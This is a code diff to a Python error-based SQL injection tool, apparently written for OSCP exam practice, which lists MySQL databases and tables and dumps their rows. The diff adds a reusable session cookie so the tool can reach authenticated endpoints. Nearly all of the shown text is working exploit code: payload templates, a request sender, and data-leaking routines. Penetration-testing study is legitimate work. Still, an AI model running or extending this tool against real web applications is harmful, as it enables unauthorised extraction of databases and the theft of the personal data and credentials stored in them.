@@ -7,6 +7,7 @@
 # Flow: list DBs -> pick all/one -> list tables -> pick all/one -> dump rows.
 # Uses the group_concat pattern (one query per column, no LIMIT loop).
 # Supports GET (param in query string) and POST (param in body).
+# Optional session cookie for endpoints that require an authenticated session.
 # Self-written manual exploit (OSCP-appropriate). Confirm exam rules before use.
 # ---------------------------------------------------------------------------
 import requests
@@ -33,6 +34,18 @@ OTHER_VALUE  = input("Other field value (anything, e.g. x)         : ").strip() 
 # GET numeric example: 1 AND [INJECT]-- -
 TEMPLATE     = input("Payload template (use [INJECT] as placeholder): ").strip()
 
+# --- Optional session cookie ----------------------------------------------
+# Name prompt has a default; pressing Enter uses it. Value prompt takes the
+# raw cookie value only (no "name=" prefix). Blank value -> run without a cookie.
+COOKIE_NAME  = input("Cookie name (Enter for default 'token')      : ").strip() or "token"
+COOKIE_VALUE = input("Session cookie value (blank = no cookie)     : ").strip()
+
+# One session reused for every request; the cookie (if set) rides along
+# automatically in the Cookie header on each request.
+SESSION = requests.Session()
+if COOKIE_VALUE:
+    SESSION.cookies.set(COOKIE_NAME, COOKIE_VALUE)
+
 # MySQL system schemas to skip when dumping "all" (still listed on screen)
 SKIP_DBS = ["information_schema", "performance_schema", "mysql", "sys"]
 
@@ -43,16 +56,17 @@ MARK = re.compile(r"~(.*?)~", re.S)
 def send(payload):
     """Send one payload with the configured method and return the response.
     GET puts the injectable field (and optional second field) in the query
-    string; POST puts them in the form body."""
+    string; POST puts them in the form body. Runs over SESSION so the cookie
+    is attached when one was provided."""
     if METHOD == "GET":
         params = {INJ_FIELD: payload}
         if OTHER_FIELD:
             params[OTHER_FIELD] = OTHER_VALUE
-        return requests.get(URL, params=params)
+        return SESSION.get(URL, params=params)
     data = {INJ_FIELD: payload}
     if OTHER_FIELD:
         data[OTHER_FIELD] = OTHER_VALUE
-    return requests.post(URL, data=data)
+    return SESSION.post(URL, data=data)
 
 # --- Core leak (beats the 32-char cap) -------------------------------------
 def leak(subquery, label=None):
@@ -99,8 +113,10 @@ if not _ver:
     print("[!] Oracle FAILED: no data leaked in the response.")
     print("    The error text is probably NOT reflected on the page.")
     print("    Error-based needs the visible ~... message; use blind instead.")
+    print("    If the endpoint needs auth, check the cookie name/value are right.")
     print(f"    method   = {METHOD}")
     print(f"    template = {TEMPLATE!r}")
+    print(f"    cookie   = {COOKIE_NAME}={'(set)' if COOKIE_VALUE else '(none)'}")
     sys.exit(1)
 print(f"[+] Oracle works. version = {_ver}\n")
 
